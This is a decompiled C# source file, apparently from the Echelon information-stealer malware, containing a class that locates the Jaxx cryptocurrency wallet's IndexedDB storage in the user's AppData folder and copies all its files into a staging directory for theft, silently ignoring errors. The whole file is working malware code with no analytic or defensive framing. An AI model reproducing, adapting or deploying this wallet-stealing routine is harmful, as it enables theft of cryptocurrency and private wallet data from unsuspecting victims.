using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x0200000C RID: 12
	internal class Jaxx
	{
		// Token: 0x0600001C RID: 28 RVA: 0x0000359C File Offset: 0x0000179C
		public static void JaxxStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Jaxx.JaxxDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Jaxx.JaxxDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Jaxx.JaxxDir);
						fileInfo.CopyTo(directorypath + Jaxx.JaxxDir + fileInfo.Name);
					}
					Jaxx.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400001E RID: 30
		public static int count;

		// Token: 0x0400001F RID: 31
		public static string JaxxDir = "\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";

		// Token: 0x04000020 RID: 32
		public static string JaxxDir2 = Help.AppDate + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";
	}
}
